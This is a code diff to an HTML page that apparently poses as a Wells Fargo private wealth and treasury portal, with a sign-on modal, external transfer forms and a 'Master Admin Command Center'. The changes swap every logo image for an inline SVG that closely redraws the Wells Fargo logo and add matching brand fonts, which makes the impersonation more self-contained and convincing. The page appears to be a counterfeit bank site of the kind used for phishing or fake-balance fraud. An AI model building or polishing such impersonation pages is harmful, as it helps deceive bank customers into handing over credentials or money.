@@ -9,13 +9,12 @@
   <meta property="og:description" content="Executive banking and treasury portal with multi-currency liquidity tracking, cash flow analytics, card controls, and dual-gate external transfers." />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
-  <link rel="icon" type="image/png" href="/assets/aistudio/Logo_40ef7a99.png" />
-  <link rel="preload" as="image" href="/assets/aistudio/Logo_40ef7a99.png" />
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 128'%3E%3Crect width='120' height='128' fill='%23FFFFFF'/%3E%3Crect x='2' y='2' width='116' height='114' fill='%23D71E28'/%3E%3Crect x='2' y='116' width='116' height='10' fill='%23FFCD41'/%3E%3Ctext x='60' y='57' text-anchor='middle' fill='%23FFFFFF' font-family='Georgia,serif' font-weight='700' font-size='27'%3EWELLS%3C/text%3E%3Ctext x='60' y='88' text-anchor='middle' fill='%23FFFFFF' font-family='Georgia,serif' font-weight='700' font-size='27'%3EFARGO%3C/text%3E%3C/svg%3E" />
 
-  <!-- Google Fonts: Plus Jakarta Sans, Inter & JetBrains Mono -->
+  <!-- Google Fonts: Arvo (Brand Slab-Serif), Plus Jakarta Sans, Inter & JetBrains Mono -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Arvo:wght@700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet" />
 
   <!-- Tailwind CSS, Chart.js, Lucide Icons & Supabase JS v2 CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -137,14 +136,15 @@
     <!-- Top Crimson Header Bar with 3px Gold Accent Line -->
     <header class="bg-[#C8102E] text-white border-b-[3px] border-[#F59E0B] md:sticky md:top-0 z-30 shadow-sm">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4 sm:gap-8">
-        <!-- Brand Logo -->
+        <!-- Brand Logo (Inline Self-Contained SVG) -->
         <a href="#top" class="flex items-center whitespace-nowrap shrink-0 rounded-lg py-1" aria-label="Wells Fargo Home">
-          <div class="flex items-center">
-            <img src="/public/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-11 w-[41px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-            <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
-              WELLSFARGO
-            </div>
-          </div>
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-11 w-[41px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
         </a>
 
         <!-- Navigation Links (Desktop) -->
@@ -346,7 +346,13 @@
     <footer class="bg-slate-950 text-slate-300 border-t border-slate-800 py-8">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs">
         <div class="flex items-center gap-3 text-slate-400">
-          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="30" height="32" loading="lazy" decoding="async" class="h-8 w-[30px] rounded object-contain shadow-sm ring-1 ring-white/15 bg-[#C8102E] shrink-0" />
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-8 w-[30px] rounded shadow-sm ring-1 ring-white/20 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
           <span>Private Wealth &amp; Executive Treasury Portal &middot; SWIFT <span class="font-mono text-slate-300">MRDNUS33XXX</span></span>
         </div>
         <button
@@ -367,12 +373,15 @@
     <!-- Top Crimson Header Bar with 3px Gold Accent Border -->
     <header class="bg-[#C8102E] text-white border-b-[3px] border-[#F59E0B] md:sticky md:top-0 z-30 shadow-sm">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 min-h-16 py-2.5 md:py-0 flex flex-wrap items-center justify-between gap-2.5 sm:gap-6">
-        <!-- Brand Logo -->
+        <!-- Brand Logo (Inline Self-Contained SVG) -->
         <div class="flex items-center shrink-0">
-          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-10 sm:h-11 w-auto rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-          <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
-            WELLS FARGO
-          </div>
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-10 sm:h-11 w-[38px] sm:w-[41px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
         </div>
 
         <!-- Client Toolbar Controls -->
@@ -700,10 +709,13 @@
             <!-- Card Top Row: Brand Logo & Contactless -->
             <div class="relative flex items-center justify-between gap-3">
               <div class="flex items-center">
-                <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="34" height="36" loading="lazy" decoding="async" class="h-9 w-[34px] rounded object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-                <div style="display:none;" class="px-2.5 py-1 rounded border border-white/40 bg-white/10 text-white text-[10px] font-bold uppercase tracking-wider">
-                  WELLS FARGO
-                </div>
+                <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-9 w-[34px] rounded shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+                  <rect width="120" height="128" fill="#FFFFFF" />
+                  <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+                  <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+                  <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+                  <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+                </svg>
               </div>
               <svg class="w-6 h-6 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-label="Contactless enabled">
                 <path d="M5 12.55a11 11 0 0 1 0-1.1"></path>
@@ -938,10 +950,13 @@
       <div class="max-w-[1380px] mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
         <div class="flex items-center gap-4 min-w-0">
           <div class="flex items-center shrink-0">
-            <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-10 sm:h-11 w-auto rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-            <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
-              WELLS FARGO
-            </div>
+            <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-10 sm:h-11 w-[38px] sm:w-[41px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+              <rect width="120" height="128" fill="#FFFFFF" />
+              <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+              <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+              <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+              <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+            </svg>
           </div>
           <span class="hidden sm:inline-block text-sm font-semibold text-amber-200 whitespace-nowrap shrink-0">Master Admin Command Center</span>
         </div>
@@ -1488,10 +1503,13 @@
       <!-- Crimson Modal Header with Brand Logo -->
       <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4">
         <div class="flex items-center gap-3">
-          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="37" height="40" loading="lazy" decoding="async" class="h-10 w-[37px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-          <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
-            WELLS FARGO
-          </div>
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-10 w-[37px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
           <span class="font-display text-sm font-bold tracking-tight text-white">Private Wealth Portal</span>
         </div>
         <button type="button" id="closeSignOnModalBtn" class="text-white/80 hover:text-white p-1.5 rounded-lg transition-colors" aria-label="Close sign on">
@@ -1565,7 +1583,13 @@
     <div class="w-full max-w-xl bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 max-h-[92vh] flex flex-col">
       <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4 shrink-0">
         <div class="flex items-center gap-3 min-w-0">
-          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="34" height="36" loading="lazy" decoding="async" class="h-9 w-[34px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E] shrink-0" />
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-9 w-[34px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
           <div class="min-w-0">
             <h2 id="transferModalTitle" class="font-display text-lg font-bold truncate">External Treasury Disbursement</h2>
             <p class="text-xs text-red-100 truncate" id="txSenderHeader">Originating Account: Timothy Townsend</p>
@@ -1807,7 +1831,13 @@
     <div class="w-full max-w-lg bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 max-h-[92vh] flex flex-col">
       <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4 shrink-0">
         <div class="flex items-center gap-3">
-          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="32" height="34" loading="lazy" decoding="async" class="h-8 w-[32px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" />
+          <svg viewBox="0 0 120 128" role="img" aria-label="Wells Fargo" class="h-8 w-[30px] rounded-md shadow-sm ring-1 ring-white/30 shrink-0" xmlns="http://www.w3.org/2000/svg">
+            <rect width="120" height="128" fill="#FFFFFF" />
+            <rect x="2" y="2" width="116" height="114" fill="#D71E28" />
+            <rect x="2" y="116" width="116" height="10" fill="#FFCD41" />
+            <text x="60" y="57" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">WELLS</text>
+            <text x="60" y="88" text-anchor="middle" fill="#FFFFFF" font-family="'Arvo', 'Rockwell', 'Clarendon', Georgia, 'Times New Roman', serif" font-weight="700" font-size="27" letter-spacing="0.4">FARGO</text>
+          </svg>
           <h2 id="clientProfileModalTitle" class="font-display text-base font-bold">Profile &amp; Account Settings</h2>
         </div>
         <button type="button" id="closeClientProfileBtn" class="text-white/80 hover:text-white p-1" aria-label="Close profile settings">
